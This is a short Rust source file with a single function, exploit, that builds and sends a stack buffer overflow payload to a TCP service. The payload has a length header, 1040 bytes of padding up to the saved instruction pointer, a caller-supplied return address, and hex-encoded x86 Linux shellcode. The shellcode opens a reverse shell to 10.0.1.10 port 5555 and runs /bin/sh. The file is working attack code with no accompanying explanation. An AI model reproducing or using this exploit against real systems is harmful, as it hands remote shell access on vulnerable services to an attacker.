use std::io::Write;
use std::iter::repeat;
use std::net::TcpStream;
use std::result::Result;
use std::usize;

pub fn exploit(stream: &mut TcpStream, return_address: u32) -> Result<usize, String> {
    let length: u32 = 2000;
    let bytes_until_eip: String = repeat('A').take(1040).collect();
    let overwritten_instruction_pointer_eip: u32 = return_address;
    let payload = hex::decode("31dbf7e35343536a0289e1b066cd809359b03fcd804979f9680a00010a68020015b389e1b066505153b30389e1cd8052686e2f7368682f2f626989e3525389e1b00bcd80").unwrap();

    let mut data: Vec<u8> = Vec::new();
    data.extend(length.to_le_bytes());
    data.extend(bytes_until_eip.as_bytes());
    data.extend(overwritten_instruction_pointer_eip.to_le_bytes());
    data.extend(payload.as_slice());

    match stream.write(data.as_slice()) {
        Ok(stream) => Ok(stream),
        Err(e) => {
            return Err(format!("Failed to write to stream: {}", e));
        }
    }
}
